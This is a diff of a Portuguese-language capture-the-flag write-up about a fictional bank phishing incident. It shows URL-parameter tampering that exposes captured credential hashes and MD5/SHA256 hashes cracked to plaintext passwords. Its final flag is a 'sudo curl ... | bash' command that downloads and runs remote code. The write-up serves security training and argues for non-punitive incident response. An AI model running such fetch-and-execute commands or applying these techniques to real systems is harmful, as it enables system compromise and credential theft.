@@ -1,4 +1,4 @@
-<img width="971" height="144" alt="image" src="https://github.com/user-attachments/assets/122502aa-0e6f-4d86-bac8-81190ebc11b1" />  
+<img width="971" height="144" alt="image" src="https://github.com/user-attachments/assets/98273769-03a9-448d-af55-1c24d332e910" />  
 
 > **Capture The Flag**  
 > **Data:** 07/2026  
@@ -207,7 +207,7 @@ A URL aparente parece levar para um portal oficial do setor de RH do banco, mas 
 https://m2va8hds01.execute-api.us-east-1.amazonaws.com/
 #### 🚩 Flag
 É interessante notar como todo esta cadeia de ataque poderia ter sido quebrada e evitada se Martín apenas seguisse a política de senhas da organização ou as práticas que detalhei em [3.5. Reutilização de senhas](#reutilização-de-senhas---50-pts).  
-Importante destacar que isso não faz de Martín "culpado" pelo incidente, mas precisamos entender onde houve a falha para evitar um evento futuro.
+Importante destacar que isso não faz de Martín "culpado" pelo incidente, mas precisamos entender onde houve a falha para evitar um evento futuro. Vamos nos aprofundar neste assunto em breve.
 
 `Flag: m2va8hds01.execute-api.us-east-1.amazonaws.com`
 
@@ -239,14 +239,64 @@ De início pode parecer difícil acreditar que alguém confiaria as credenciais 
 
 ---
 ### Alterando parâmetros - 100 pts
+Aparentemente eles utilizaram um sistema bem simples para captura de credenciais. A aplicação possui apenas um endpoint e executa as ações de acordo com o parâmetro de URL action. Envie um nome de usuário e uma senha como teste e, em seguida, altere o parâmetro action da URL para verificar se conseguimos obter alguma informação interessante.
+#### 🧭 Exploração
+Inserindo credenciais aleatórias no formulário, o site nos redireciona para a seguinte tela:
+<img width="1296" height="687" alt="image" src="https://github.com/user-attachments/assets/1ead83c3-b4eb-4c13-b1c7-1f2d84b99288" />  
 
+Alterando a URL de `https://m2va8hds01.execute-api.us-east-1.amazonaws.com/?action=registrar` para `https://m2va8hds01.execute-api.us-east-1.amazonaws.com/?action=listar`  
+
+Obtemos a resposta:  
+```
+{"flag":"GoHacking{OParametroCertoAsVezesAjuda}","captura1":{"usuario":"levi.farias","hash":"7abf11935960fc499dbb5055fea98cb7"},"captura2":{"usuario":"carlos.mota","hash":"c61024d89f8d48812dc6cde58cfc1ae4664f5fc44e5f7b95f2cdaab6baefeaad"}}
+```
+#### 🚩 Flag
+Essa lista revela que os colaboradores Levi Farias e Carlos Mota tiveram suas credenciais capturadas pelo site.
+
+`Flag: GoHacking{OParametroCertoAsVezesAjuda}`
+
+---
 ### Hashes - 50 pts
+Analisando os hashes das credenciais capturadas pelos atacantes, quais das alternativas abaixo representam, respectivamente, os algoritmos de hash utilizados para armazenar as credenciais dos usuários levi.farias e carlos.mota?
+#### 🧭 Exploração
+Testando diferentes tipos de Hashs em decriptadores online eventualmente descobro a função específica de cada e no que elas traduzem.  
+```
+7abf11935960fc499dbb5055fea98cb7 : chewbacca01  
+c61024d89f8d48812dc6cde58cfc1ae4664f5fc44e5f7b95f2cdaab6baefeaad : 200898
+```
+#### 🚩 Flag
+Hashing é uma função matemática que transforma um dado em uma sequência alfanumérica irreversível que não possui chaves e nunca muda, geralmente utilizada em bancos de dados para evitar que senhas sejam salvas em texto claro.
 
+`Flag: MD5 | SHA256`
+
+---
 ### Quebrando hashes 1 - 50 pts
+Qual a senha do usuário levi.farias?
+#### 🚩 Flag
+`Flag: chewbacca01`
 
+---
 ### Quebrando hashes 2 - 50 pts
+Qual a senha do usuário carlos.mota?
+#### 🚩 Flag
+`Flag: 200898`
 
+---
 ### O lado negro da força... - 100 pts
+Uma das estratégias comuns dos Grupos Hackers atuais é o recrutamento de funcionários insatisfeitos, técnicas de persuasão e chantagem emocional. Na maioria das vezes eles oferecem quantias interessantes em criptomoedas para que o colaborador execute um comando, artefato malicioso ou forneça uma credencial privilegiada para acesso a rede interna da organização. Com as informações obtidas até agora, busque identificar indícios de que um de nossos padawans tenha sido recrutado pelo Lord Sith. A flag é o comando executado.
+#### 🧭 Exploração
+Agora que temos as credenciais de ambos podemos buscar por mensagens suspeitas em seus e-mails. Ao abrir a caixa de entrada de Levi Farias identifico a seguinte mensagem:  
+
+![](Prints/Pasted%20image%2020260729032648.png)
+
+Os atacantes utilizaram as credenciais obtidas durante o Spear Phishing para conseguir informações sigilosas do banco, abrindo brecha para chantagear Levi à executar o comando.
+### 🚩 Flag
+Este é um exemplo extremamente didático do porque não podemos encarar um incidente seguindo uma lógica de "punir o culpado pelo vazamento", quando este ocorre de maneira acidental/involuntária.  
+Vamos analisar a situação: Levi, receioso de ser punido por acidentalmente permitir que atacantes adiquirissem supostas "informações privilegiadas", se viu vulnerável à uma chantagem e foi instrumentalizado como um vetor de ataque crucial.  
+Observação: Nem sequer temos certeza de que os P3PP4 H4CK3RS realmente possuem as informações críticas que afirmam ter.  
+Podemos concluir que um incidente grave pode ser evitável quando as lideranças e equipes de segurança se demonstram compreensivas em frente à um acidente. Não apenas isso deve ser uma política interna, como deve ser transparente para todos os colaboradores da organização.
+
+`Flag: sudo curl 'https://gh4m3sz9t6.execute-api.us-east-1.amazonaws.com/default/install/MQ-2501' | bash`
 
 ---
 
